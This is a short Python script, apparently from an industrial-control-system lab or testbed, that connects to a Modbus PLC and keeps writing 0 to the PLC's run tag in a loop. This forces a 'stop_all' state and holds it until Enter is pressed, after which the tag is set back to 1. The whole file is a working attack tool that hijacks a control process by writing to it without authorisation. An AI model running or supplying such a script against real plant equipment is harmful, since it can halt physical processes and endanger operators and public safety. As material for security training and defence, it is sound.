#!/usr/bin/env python3

#########################################
# Imports
#########################################
import logging
import argparse
import time
import os
import sys
import json
import threading
import contextlib

import io
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

with open(os.devnull, 'w') as fnull, contextlib.redirect_stdout(fnull), contextlib.redirect_stderr(fnull):
    from world import (
        PLC_SERVER_IP,
        PLC_RW_ADDR,
        PLC_TAG_RUN, PLC_TAG_NOZZLE, PLC_TAG_MOTOR,
        PLC_TAG_CONTACT, PLC_TAG_LEVEL
    )

from modbus import ClientModbus as Client
from modbus import ConnectionException

#########################################
# Logging
#########################################
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

PORTS_FILE = os.path.join(os.path.dirname(__file__), '..', 'ports.json')
PORTS_FILE = os.path.abspath(PORTS_FILE)

parser = argparse.ArgumentParser(description="Activate the 'stop_all' mode from ModBus.")
parser.add_argument('--ip', required=True, help='ModBus server IP address')
parser.add_argument('--port', required=True, help='Modbus server port')
args = parser.parse_args()

with open(PORTS_FILE, "r") as f:
    ports = json.load(f)

client = Client(args.ip, args.port)
stop_attack = False

def listen_for_enter():
    input("")
    global stop_attack
    stop_attack = True

try:
    client.connect()

    listener_thread = threading.Thread(target=listen_for_enter)
    listener_thread.daemon = True
    listener_thread.start()

    while not stop_attack:
        client.write(PLC_RW_ADDR + PLC_TAG_RUN, 0)

    client.write(PLC_RW_ADDR + PLC_TAG_RUN, 1)

except Exception as e:
    log.error(f"Connection or writing error: {e}")
